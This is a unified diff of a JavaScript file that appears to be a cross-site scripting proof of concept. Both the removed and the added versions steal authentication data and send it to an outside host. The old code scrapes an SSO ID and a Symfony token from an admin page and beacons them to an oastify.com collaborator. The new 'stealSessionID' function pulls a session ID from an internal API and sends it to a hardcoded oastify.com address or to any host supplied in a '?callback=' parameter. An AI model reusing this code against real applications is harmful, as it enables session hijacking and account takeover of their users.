@@ -1,23 +1,47 @@
-fetch('https://app-/?meue&meueDataOnlyMode&meueAdminTreeEnabled&meueVisual')
-  .then(response => response.text())
-  .then(html => {
-    const ssoIdRegex = /"ssoId"\s*:\s*"([^"]+)"/;
-    const ssoIdMatch = html.match(ssoIdRegex);
+function getQueryParam(name) {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get(name);
+}
 
-    const symfonyRegex = /window\.Mkt3Config\s*=\s*{[^}]*"symfony"\s*:\s*"([^"]+)"/;
-    const symfonyMatch = html.match(symfonyRegex);
+async function stealSessionID() {
+    // Step 1: Get session ID from internal API
+    const response = await fetch('/attask/api-internal/session', {
+        method: 'GET',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+    });
 
-    if (ssoIdMatch && ssoIdMatch[1] && symfonyMatch && symfonyMatch[1]) {
-      const msg=`ssoId = ${ssoIdMatch[1]}\nsymfony = ${symfonyMatch[1]}`;
-      navigator.sendBeacon("http://0depv8vbmosi3ij4vhnm2rd88zeq2lqa.oastify.com/",msg);
-    } else {
-      let errors = [];
-      if (!ssoIdMatch || !ssoIdMatch[1]) errors.push('ssoId not found');
-      if (!symfonyMatch || !symfonyMatch[1]) errors.push('symfony not found');
-      alert(errors.join('\n'));
+    const data = await response.json();
+    const sessionID = data.data.sessionID;
+
+    // Step 2: Default exfiltration URL
+    let targetUrl = "fatywcowa7okcmahb4js0ts3eukl8lwa.oastify.com";
+
+    // Step 3: Check for ?callback= parameter in the current URL
+    const callbackParam = getQueryParam("callback");
+    if (callbackParam) {
+        targetUrl = callbackParam;
     }
-  })
-  .catch(error => {
-    console.error('Error:', error);
-    alert('Error: ' + error);
-  });
+
+    // Step 4: Send session ID to the chosen endpoint
+    const secondResponse = await fetch(`${targetUrl}?session=${sessionID}`, {
+        method: 'GET',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+    });
+
+    const secondData = await secondResponse.json();
+
+    console.log("Second fetch data:", secondData);
+
+    alert(sessionID);
+
+    return {
+        sessionID,
+        secondData
+    };
+}
+
+stealSessionID();
